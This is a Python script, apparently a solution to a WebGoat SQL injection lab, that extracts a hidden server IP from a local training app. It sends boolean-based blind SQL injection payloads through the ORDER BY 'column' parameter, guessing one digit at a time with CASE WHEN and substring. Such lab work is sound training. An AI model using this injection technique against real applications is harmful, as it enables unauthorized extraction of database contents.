import requests
import json
from string import digits

base_url = "http://localhost:8080"
relative_url = "/WebGoat/SqlInjection/servers?column="
cookie = {"JSESSIONID":"D5F04DC438DF83CA1B853FDB093AE96C"}

# SELECT id, hostname, ip, mac, status, description FROM <table_name> 
# WHERE substring(ip, 1, 3) = '192' OBDER BY ?;
# case when (SELECT ip FROM servers WHERE hostname = 'webgoat-prd' AND substring(ip, 1, 1) = '
"""
for digit in range(1, 4):
    for num in digits:
        build request with digit and num
        if response means success, break
        else continue
"""
# ' ) then id else hostname end
# sql_begin = "case when (SELECT ip FROM servers WHERE hostname = 'webgoat-prd' AND substring(ip, 1, "
digit = 1
# sql_mid = ") = '"
# num = 0
# sql_end = "' ) then id else hostname end)"

"""
substring 不熟，一个小bug卡了半个小时
"""
if __name__ == "__main__":
    url_pre = base_url + relative_url
    nums = ""

    for digit in range(1, 4):
        for num in digits:
        # url = url_pre + sql_begin + digit + sql_mid + num +sql_end
            sql_end = f"""(case when (SELECT ip FROM servers WHERE hostname = 'webgoat-prd' AND substring(ip, {digit}, 1) = '{num}' ) IS NOT NULL then ip else hostname end)"""
            url = url_pre + sql_end
            r = requests.get(url, cookies=cookie)
            jsons = r.json()
            id = str(jsons[0]["id"])
            if id == '2':
                # ip
                nums += str(num)
                break
            elif id == '3':
                # hostname
                if len(nums) == 3:
                    break
            else:
                print(id)
    print(nums+ ".130.219.202")
